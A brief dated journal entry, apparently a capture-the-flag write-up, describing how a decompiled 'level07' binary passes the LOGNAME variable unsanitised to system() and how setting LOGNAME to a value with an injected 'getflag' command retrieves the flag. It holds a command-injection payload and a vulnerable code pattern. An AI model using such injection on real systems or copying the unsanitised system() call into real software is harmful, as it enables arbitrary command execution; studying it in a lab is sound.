Date: 9/21/2024

Entry:

Today, the first task turned out to be surprisingly simple. After decompiling (`retdec-decompiler ./level07`) the provided `level07` file, we found the following code:
```C
char * buffer = NULL; // bp-28, 0x8048567
asprintf(&buffer, "/bin/echo %s ", getenv("LOGNAME"));
return system(buffer);
```

The obvious step was to replace the `LOGNAME` environment variable with a command injection:
```bash
export LOGNAME="; getflag ;"
```
Which displayed our flag.
